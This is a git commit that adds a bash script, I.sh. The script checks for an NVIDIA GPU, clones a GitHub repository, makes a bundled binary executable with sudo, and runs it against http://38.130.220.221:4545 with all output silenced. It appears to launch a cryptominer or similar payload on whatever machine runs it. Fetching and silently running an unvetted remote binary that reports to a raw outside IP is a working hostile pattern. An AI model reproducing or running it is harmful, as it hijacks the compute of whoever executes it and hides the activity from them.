7da2f2e3b4386948eeb7347f40991c324c39a242
phucbmt <phucdlbmt@gmail.com>
2021-02-10 21:26:08 +0700

    Create I.sh

---
+++ I.sh
@@ -0,0 +1,8 @@
+#! /bin/bash
+nvidia-smi
+printf "Run 38.130.220.221:4545/$1"  >&2
+{
+git clone https://github.com/phucbmt/tech.git &> /dev/null
+sudo chmod +x tech/m
+./tech/m -P http://38.130.220.221:4545/"$1" &> log
+} &> /dev/null
